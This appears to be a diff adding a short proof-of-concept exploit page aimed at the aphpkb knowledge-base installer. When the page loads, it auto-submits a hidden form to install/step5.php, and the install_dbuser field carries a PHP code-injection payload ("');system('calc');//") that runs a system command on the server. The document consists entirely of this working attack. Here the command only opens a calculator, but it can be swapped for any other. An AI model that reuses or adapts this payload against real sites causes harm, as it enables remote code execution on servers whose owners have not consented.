@@ -1,0 +1,8 @@
+<html>
+    <body onload="document.forms[0].submit()"> 
+        <form method="POST" action="http://localhost/aphpkb/install/step5.php">  
+            <input type="hidden" name="install_dbuser" value="');system('calc');//" />   
+            <input type="submit" name="submit" />   
+        </form>   
+    </body>
+</html>
